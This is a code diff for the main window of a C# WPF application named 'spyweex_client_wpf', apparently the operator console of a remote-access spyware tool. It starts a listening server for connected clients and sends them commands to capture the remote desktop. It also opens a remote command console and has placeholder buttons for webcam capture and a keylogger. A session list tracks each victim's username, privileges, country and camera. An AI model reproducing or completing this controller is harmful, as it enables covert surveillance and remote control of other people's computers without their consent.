@@ -1,9 +1,14 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Collections.ObjectModel;
+using System.ComponentModel;
+using System.Diagnostics;
 using System.Globalization;
 using System.Linq;
+using System.Net;
+using System.Net.NetworkInformation;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Controls;
@@ -15,6 +20,9 @@ using System.Windows.Media;
 using System.Windows.Media.Imaging;
 using System.Windows.Navigation;
 using System.Windows.Shapes;
+using System.Windows.Threading;
+using spyweex_client_wpf.StaticStrings;
+
 
 namespace spyweex_client_wpf
 {
@@ -23,49 +31,69 @@ namespace spyweex_client_wpf
     /// </summary>
     public partial class MainWindow : Window
     {
-        public class Session
-        {
-            public string ID { get; set; }
-            public string IP { get; set; }
-            public string Username { get; set; }
-            public string ComputerName { get; set; }
-            public string Privileges { get; set; }
-            public string OS { get; set; }
-            public string Uptime { get; set; }
-            public string Country { get; set; }
-            public string Cam { get; set; }
-            public string InstallDate { get; set; }
-        }
 
         /// <summary>
         /// sessions source for listview.
         /// </summary>
-        ObservableCollection<Session> sessions = new ObservableCollection<Session>();
-        public Session SelectedSession { get; set; }
+
+        private WxhtpServiceServer _wxhtpServiceServer;
+        CancellationTokenSource cts = new CancellationTokenSource();
+        CancellationToken ct;
+
+        public delegate void updateCmdTextBoxDelegate(string cmd, string response);
+        public updateCmdTextBoxDelegate updateCmdTextBox;
+
+        DScreenListener dsListener;
+        CmdExecListener ceListener;
 
         public MainWindow()
         {
+            ViewModel vmSession = new ViewModel();
+            DataContext = vmSession;
             InitializeComponent();
+            dsListener = new DScreenListener();
+            ceListener = new CmdExecListener();
         }
 
         private void Window_Loaded(object sender, RoutedEventArgs e)
         {
-            SessionListView.ItemsSource = sessions;
+            SessionListView.ItemsSource = ((ViewModel)DataContext).sessions;
+            ((ViewModel)DataContext).sessions.Add(new Session("1", "123.123.123.123"));
+            ((ViewModel)DataContext).sessions.Add(new Session("2", "321.321.321.321"));
         }
 
-        private void btnStart_Clicked(object sender, RoutedEventArgs e)
+        private async void btnStart_Clicked(object sender, RoutedEventArgs e)
         {
+            if (_wxhtpServiceServer != null)
+            {
+                await _wxhtpServiceServer.Stop();
+                _wxhtpServiceServer = null;
+            }
+            _wxhtpServiceServer = new WxhtpServiceServer(Utils.GetAllLocalIPv4(NetworkInterfaceType.Wireless80211).FirstOrDefault(), 61234);
+            _wxhtpServiceServer.Start();
 
+            LabelAppStatus.Content = "Server started";
+            await _wxhtpServiceServer.Run();
         }
 
-        private void btnStop_Clicked(object sender, RoutedEventArgs e)
+        private async void btnStop_Clicked(object sender, RoutedEventArgs e)
         {
-
+            try
+            {
+                var stopTask = _wxhtpServiceServer?.Stop();
+                if (stopTask != null) await stopTask;
+                _wxhtpServiceServer = null;
+                LabelAppStatus.Content = string.Format("Server stopped");
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine("Exception in btnStop " + ex);
+            }
         }
 
         private void btnCancel_Clicked(object sender, RoutedEventArgs e)
         {
-
+            cts?.Cancel();
         }
 
         private void btnIP_Clicked(object sender, RoutedEventArgs e)
@@ -73,9 +101,26 @@ namespace spyweex_client_wpf
 
         }
 
-        private void btnDesktopScreen_Clicked(object sender, RoutedEventArgs e)
+        private async void btnDesktopScreen_Clicked(object sender, RoutedEventArgs e)
         {
-
+            //if (dsListener.isSubscribed) return;
+            WxhtpClient wxhtpClient;
+            try
+            {
+                wxhtpClient = _wxhtpServiceServer.TryGetLastOrDefaultClient();
+                ct = cts.Token;
+                await wxhtpClient.ExecuteTask(
+                    ct, wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString(), METHOD_TYPE.GET, ACTION_TYPE.TAKE_DESKTOP_SCREEN, PARAM_TYPES.number + "1");
+                dsListener.Subscribe(ref wxhtpClient);
+            }
+            catch (ArgumentNullException ex)
+            {
+                Debug.Write(ex.Message);
+            }
+            catch (TaskCanceledException tce)
+            {
+                Debug.Write("Task was canceled " + tce.Message);
+            }
         }
 
         private void btnWebcamScreen_Clicked(object sender, RoutedEventArgs e)
@@ -95,7 +140,8 @@ namespace spyweex_client_wpf
 
         private void btnCmdPrompt_Clicked(object sender, RoutedEventArgs e)
         {
-
+            var consoleWindow = new Console { Owner = this };
+            consoleWindow.Show();
         }
 
         private void btnKeylogger_Clicked(object sender, ContextMenuEventArgs e)
